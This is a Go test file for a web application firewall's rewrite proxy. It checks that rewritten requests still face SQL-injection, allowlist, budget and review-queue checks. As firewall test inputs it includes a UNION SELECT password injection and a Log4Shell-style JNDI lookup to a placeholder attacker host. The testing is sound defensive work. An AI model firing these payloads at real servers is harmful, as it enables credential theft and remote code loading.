package proxy

import (
	"bytes"
	"compress/gzip"
	"context"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/LaokeQwQ/CheeseWAF/internal/config"
	"github.com/LaokeQwQ/CheeseWAF/internal/engine"
	"github.com/LaokeQwQ/CheeseWAF/internal/engine/rules"
	"github.com/LaokeQwQ/CheeseWAF/internal/engine/semantic"
)

func newRewriteWAFServer(t *testing.T, replacement string, pipeline *engine.Pipeline, configure func(*config.Config)) (*Server, *captureSink) {
	t.Helper()
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("X-Upstream-URI", r.URL.RequestURI())
		_, _ = io.Copy(w, r.Body)
	}))
	t.Cleanup(upstream.Close)
	cfg := reviewProxyConfig(upstream.URL)
	cfg.Protection.Bot.Enabled = false
	cfg.APISec.Enabled = false
	cfg.Protection.Policy.WebAttack = config.ProtectionLevelStrict
	cfg.Sites[0].WAF.Enabled = true
	cfg.Sites[0].WAF.Mode = "block"
	cfg.Sites[0].WAF.SemanticPolicy.DetectionBudget = time.Second
	cfg.Sites[0].WAF.Rewrite = []config.RewriteRuleConfig{{ID: "route", Enabled: true, Pattern: "^/original$", Replacement: replacement}}
	if configure != nil {
		configure(&cfg)
	}
	sink := &captureSink{}
	server, err := NewServer(&cfg, pipeline, sink)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = server.Close() })
	return server, sink
}

func TestRewriteWAFKeepsPublicCustomRuleInputs(t *testing.T) {
	for _, tc := range []struct{ location, pattern string }{
		{"uri", `^/original$`},
		{"request_uri", `^/original\?needle=public$`},
		{"query", `needle=public`},
		{"args", `public`},
	} {
		t.Run(tc.location, func(t *testing.T) {
			detector := rules.New([]rules.Rule{{ID: "public", Name: "public", Enabled: true, Location: tc.location, Pattern: regexp.MustCompile(tc.pattern), Action: engine.ActionBlock, Severity: engine.SeverityHigh}})
			server, _ := newRewriteWAFServer(t, "/target?clean=1", engine.NewPipeline(detector), nil)
			rec := httptest.NewRecorder()
			server.Handler().ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "http://localhost/original?needle=public", nil))
			if rec.Code != http.StatusForbidden || rec.Header().Get("X-Upstream-URI") != "" {
				t.Fatalf("public %s rule bypassed: status=%d upstream=%q", tc.location, rec.Code, rec.Header().Get("X-Upstream-URI"))
			}
		})
	}
}

func TestRewriteWAFKeepsPublicSQLQuery(t *testing.T) {
	server, _ := newRewriteWAFServer(t, "/target?clean=1", engine.NewPipeline(semantic.NewAnalyzer("block", 3)), nil)
	rec := httptest.NewRecorder()
	server.Handler().ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "http://localhost/original?id="+url.QueryEscape("1 UNION SELECT password FROM users"), nil))
	if rec.Code != http.StatusForbidden {
		t.Fatalf("replacement removed public SQL finding: status=%d", rec.Code)
	}
}

func TestRewriteWAFDoesNotInheritTargetAllowlistForPublicBody(t *testing.T) {
	analyzer := semantic.NewAnalyzer("block", 3)
	analyzer.SetAllowlists([]string{"/health"}, nil)
	server, _ := newRewriteWAFServer(t, "/health", engine.NewPipeline(analyzer), nil)
	req := httptest.NewRequest(http.MethodPost, "http://localhost/original", strings.NewReader(url.Values{"id": {"1 UNION SELECT password FROM users"}}.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	rec := httptest.NewRecorder()
	server.Handler().ServeHTTP(rec, req)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("target allowlist skipped public malicious body: status=%d", rec.Code)
	}
}

func TestRewriteWAFStillChecksTargetAndForwardsCleanTarget(t *testing.T) {
	for _, tc := range []struct {
		target string
		want   int
	}{
		{"/target?id=" + url.QueryEscape("1 UNION SELECT password FROM users"), http.StatusForbidden},
		{"/target?clean=1", http.StatusOK},
	} {
		server, _ := newRewriteWAFServer(t, tc.target, engine.NewPipeline(semantic.NewAnalyzer("block", 3)), nil)
		rec := httptest.NewRecorder()
		server.Handler().ServeHTTP(rec, httptest.NewRequest(http.MethodPost, "http://localhost/original", strings.NewReader("clean")))
		if rec.Code != tc.want || (tc.want == http.StatusOK && (rec.Header().Get("X-Upstream-URI") != tc.target || rec.Body.String() != "clean")) {
			t.Fatalf("target %q status=%d uri=%q body=%q", tc.target, rec.Code, rec.Header().Get("X-Upstream-URI"), rec.Body.String())
		}
	}
}

type rewriteBodyDetector struct {
	mu   sync.Mutex
	seen map[string]string
}

func (*rewriteBodyDetector) ID() string    { return "rewrite.body" }
func (*rewriteBodyDetector) Name() string  { return "rewrite body" }
func (*rewriteBodyDetector) Priority() int { return 250 }
func (d *rewriteBodyDetector) Detect(_ context.Context, c *engine.RequestContext) (*engine.DetectionResult, error) {
	if err := c.EnsureBody(); err != nil {
		return nil, err
	}
	if err := c.Request.ParseForm(); err != nil {
		return nil, err
	}
	d.mu.Lock()
	d.seen[c.Request.URL.RequestURI()] = c.Request.Form.Get("q")
	d.mu.Unlock()
	return nil, nil
}

type rewriteWireBody struct {
	*bytes.Reader
	bytes, closes atomic.Int64
	closed        chan struct{}
}

func (b *rewriteWireBody) Read(p []byte) (int, error) {
	n, err := b.Reader.Read(p)
	b.bytes.Add(int64(n))
	return n, err
}
func (b *rewriteWireBody) Close() error {
	if b.closes.Add(1) == 1 {
		close(b.closed)
	}
	return nil
}

func TestRewriteWAFViewsReadGzipChunkedWireBodyOnce(t *testing.T) {
	var compressed bytes.Buffer
	writer := gzip.NewWriter(&compressed)
	_, _ = io.WriteString(writer, "q=shared-body")
	_ = writer.Close()
	detector := &rewriteBodyDetector{seen: map[string]string{}}
	server, _ := newRewriteWAFServer(t, "/target?target=1", engine.NewPipeline(detector), nil)
	body := &rewriteWireBody{Reader: bytes.NewReader(compressed.Bytes()), closed: make(chan struct{})}
	req := httptest.NewRequest(http.MethodPost, "http://localhost/original?public=1", nil)
	req.Body, req.ContentLength = body, -1
	req.TransferEncoding = []string{"chunked"}
	req.Header.Set("Content-Encoding", "gzip")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	rec := httptest.NewRecorder()
	server.Handler().ServeHTTP(rec, req)
	if rec.Code != http.StatusOK || rec.Header().Get("X-Upstream-URI") != "/target?target=1" || !bytes.Equal(rec.Body.Bytes(), compressed.Bytes()) {
		t.Fatalf("wire body changed: status=%d uri=%q body=%x", rec.Code, rec.Header().Get("X-Upstream-URI"), rec.Body.Bytes())
	}
	select {
	case <-body.closed:
	case <-time.After(5 * time.Second):
		t.Fatal("original wire body was not closed")
	}
	if body.bytes.Load() != int64(compressed.Len()) || body.closes.Load() != 1 {
		t.Fatalf("wire body read=%d/%d closes=%d, want one original read", body.bytes.Load(), compressed.Len(), body.closes.Load())
	}
	if len(detector.seen) != 2 || detector.seen["/original?public=1"] != "shared-body" || detector.seen["/target?target=1"] != "shared-body" {
		t.Fatalf("independent semantic views not materialized: %#v", detector.seen)
	}
}

type rewriteSpentBudgetPipeline struct {
	budgets []time.Duration
	inner   *engine.Pipeline
}

func (p *rewriteSpentBudgetPipeline) Detect(ctx context.Context, c *engine.RequestContext) (*engine.DetectionResult, error) {
	p.budgets = append(p.budgets, c.Metadata["detection_budget"].(time.Duration))
	if len(p.budgets) == 1 {
		<-time.After(25 * time.Millisecond)
		return nil, nil
	}
	return p.inner.Detect(ctx, c)
}

func TestRewriteWAFSharesBudgetAndPreservesExhaustionPolicy(t *testing.T) {
	for _, policy := range []string{"open", "observe", "closed"} {
		t.Run(policy, func(t *testing.T) {
			server, sink := newRewriteWAFServer(t, "/target", engine.NewPipeline(), func(cfg *config.Config) {
				cfg.Sites[0].WAF.SemanticPolicy.DetectionBudget = 20 * time.Millisecond
				cfg.Sites[0].WAF.SemanticPolicy.BudgetExhaustedPolicy = policy
			})
			probe := &rewriteSpentBudgetPipeline{inner: engine.NewPipeline(overBudgetDetector{})}
			server.pipeline = probe
			rec := httptest.NewRecorder()
			server.Handler().ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "http://localhost/original", nil))
			want := http.StatusOK
			if policy == "closed" {
				want = http.StatusForbidden
			}
			if rec.Code != want || len(probe.budgets) != 2 || probe.budgets[1] != time.Nanosecond {
				t.Fatalf("shared budget/fail-mode changed: status=%d want=%d budgets=%v", rec.Code, want, probe.budgets)
			}
			if len(sink.entries) != 1 || sink.entries[0].Metadata["detection_budget_exhausted"] != true {
				t.Fatalf("budget exhaustion audit was lost: %#v", sink.entries)
			}
		})
	}
}

type rewriteIndependentEvidencePipeline struct {
	calls int
	leak  bool
}

func (p *rewriteIndependentEvidencePipeline) Detect(_ context.Context, c *engine.RequestContext) (*engine.DetectionResult, error) {
	p.calls++
	category := "sqli"
	if c.Request.URL.Path == "/original" {
		c.Metadata["semantic_skipped"] = "public-only"
	} else {
		p.leak = c.Metadata["semantic_skipped"] != nil
		category = "xss"
	}
	result := engine.DetectionResult{Detected: true, DetectorID: category, Category: category, Payload: "same body", Severity: engine.SeverityLow, Confidence: 0.4, Action: engine.ActionBlock}
	c.Results = append(c.Results, result)
	return &result, nil
}

func TestRewriteWAFDoesNotAccumulateDuplicateBodyEvidenceOrSkipState(t *testing.T) {
	server, sink := newRewriteWAFServer(t, "/target", engine.NewPipeline(), nil)
	probe := &rewriteIndependentEvidencePipeline{}
	server.pipeline = probe
	rec := httptest.NewRecorder()
	server.Handler().ServeHTTP(rec, httptest.NewRequest(http.MethodPost, "http://localhost/original", strings.NewReader("same body")))
	if rec.Code != http.StatusOK || probe.calls != 2 || probe.leak {
		t.Fatalf("identity evidence or skip state accumulated: status=%d calls=%d leak=%v", rec.Code, probe.calls, probe.leak)
	}
	if len(sink.entries) != 1 {
		t.Fatalf("logs=%d, want one request audit", len(sink.entries))
	}
	decision, ok := sink.entries[0].Metadata["waf_policy_decision"].(webAttackPolicyDecision)
	if !ok || decision.EvidenceCount != 1 || decision.RiskScore != 14 {
		t.Fatalf("body evidence was combined across identities: %+v", sink.entries[0].Metadata["waf_policy_decision"])
	}
}

type rewriteCoveragePipeline struct {
	policy string
	inner  *engine.Pipeline
}

func (p rewriteCoveragePipeline) Detect(ctx context.Context, c *engine.RequestContext) (*engine.DetectionResult, error) {
	if c.Request.URL.Path == "/original" {
		c.Metadata["detection_input_incomplete"] = false
		if p.policy == "observe" {
			return &engine.DetectionResult{Detected: true, Category: "custom_rule", Action: engine.ActionLog, Message: "public audit"}, nil
		}
		return nil, nil
	}
	return p.inner.Detect(ctx, c)
}

func TestRewriteWAFPreservesIncompleteCoverageAcrossViews(t *testing.T) {
	for _, policy := range []string{"open", "observe"} {
		t.Run(policy, func(t *testing.T) {
			server, sink := newRewriteWAFServer(t, "/target", engine.NewPipeline(), func(cfg *config.Config) {
				cfg.Sites[0].WAF.SemanticPolicy.BudgetExhaustedPolicy = policy
			})
			server.pipeline = rewriteCoveragePipeline{policy: policy, inner: engine.NewPipeline(incompleteInputDetector{})}
			rec := httptest.NewRecorder()
			server.Handler().ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "http://localhost/original", nil))
			if rec.Code != http.StatusOK || len(sink.entries) != 1 {
				t.Fatalf("coverage fail-mode status=%d logs=%d", rec.Code, len(sink.entries))
			}
			metadata := sink.entries[0].Metadata
			if metadata["detection_input_incomplete"] != true || metadata["detection_analysis_incomplete"] != true || metadata["detection_analysis_incomplete_reason"] == nil {
				t.Fatalf("other identity's coverage diagnostics were lost: %v", metadata)
			}
			if metadata["detection_budget_exhausted"] == true {
				t.Fatal("typed incomplete input was changed to budget exhaustion")
			}
		})
	}
}

func TestRewriteWAFKeepsReviewCandidateAndItsInspectionURI(t *testing.T) {
	for _, tc := range []struct {
		name, target, allowlist, wantURI string
	}{
		{"target-only candidate", "/target?origin=1", "/original", "/target?origin=1"},
		{"public-only candidate", "/health?origin=1", "/health", "/original?public=1"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			analyzer := semantic.NewAnalyzer("block", 3)
			analyzer.SetAllowlists([]string{tc.allowlist}, nil)
			server, sink := newRewriteWAFServer(t, tc.target, engine.NewPipeline(analyzer), nil)
			queue := &memoryReviewQueue{}
			server.SetReviewQueue(queue)
			req := httptest.NewRequest(http.MethodPost, "http://localhost/original?public=1", strings.NewReader("note ${jndi:ldap://evil.example/a} in logs"))
			req.Header.Set("Content-Type", "text/plain")
			rec := httptest.NewRecorder()
			server.Handler().ServeHTTP(rec, req)
			items := queue.snapshot()
			if rec.Code != http.StatusOK || len(items) != 1 {
				t.Fatalf("review candidate was lost: status=%d items=%+v", rec.Code, items)
			}
			if items[0].URI != tc.wantURI || items[0].Shape != "embedded" {
				t.Fatalf("review candidate identity mismatch: %+v, want URI %q", items[0], tc.wantURI)
			}
			if rec.Header().Get("X-Upstream-URI") != tc.target || sink.entries[0].Metadata["original_uri"] != "/original?public=1" || sink.entries[0].Metadata["upstream_uri"] != tc.target {
				t.Fatal("selected review identity changed transport or public/upstream audit fields")
			}
		})
	}
}

type rewriteReviewCandidatePipeline struct{}

func (rewriteReviewCandidatePipeline) Detect(_ context.Context, c *engine.RequestContext) (*engine.DetectionResult, error) {
	c.Metadata["review_candidate"] = map[string]any{
		"category": "sqli", "severity": "high", "payload": "candidate", "shape": "embedded", "protection_level": 4,
	}
	return nil, nil
}

func TestRewriteWAFPreservesPromotedBlockBelowOrdinaryThreshold(t *testing.T) {
	server, _ := newRewriteWAFServer(t, "/target", engine.NewPipeline(semantic.NewAnalyzer("block", 4)), func(cfg *config.Config) {
		cfg.Sites[0].WAF.ParanoiaLevel = 4
		cfg.Sites[0].WAF.SemanticPolicy.PromoteSeconds = 30
		cfg.Protection.Policy.WebAttack = config.ProtectionLevelLow
	})
	queue := &memoryReviewQueue{}
	server.SetReviewQueue(queue)
	request := func(body string) *httptest.ResponseRecorder {
		req := httptest.NewRequest(http.MethodPost, "http://localhost/original", strings.NewReader(body))
		req.Header.Set("Content-Type", "text/plain")
		rec := httptest.NewRecorder()
		server.Handler().ServeHTTP(rec, req)
		return rec
	}
	if first := request("note ${jndi:ldap://evil.example/a} in logs"); first.Code != http.StatusOK || len(queue.snapshot()) != 1 {
		t.Fatalf("first embedded finding must pass and arm promotion: status=%d items=%+v", first.Code, queue.snapshot())
	}
	if first := queue.snapshot()[0]; first.Shape != "embedded" || !server.promotes.Active(first.SiteID, server.wallNow()) {
		t.Fatalf("first finding did not arm embedded promotion: %+v", first)
	}
	server.pipeline = rewriteReviewCandidatePipeline{}
	if second := request("candidate"); second.Code != http.StatusForbidden {
		t.Fatalf("rewrite downgraded promoted block to ordinary low threshold: status=%d body=%q", second.Code, second.Body.String())
	}
	if len(queue.snapshot()) != 1 {
		t.Fatal("promoted block enqueued the same candidate again")
	}
}
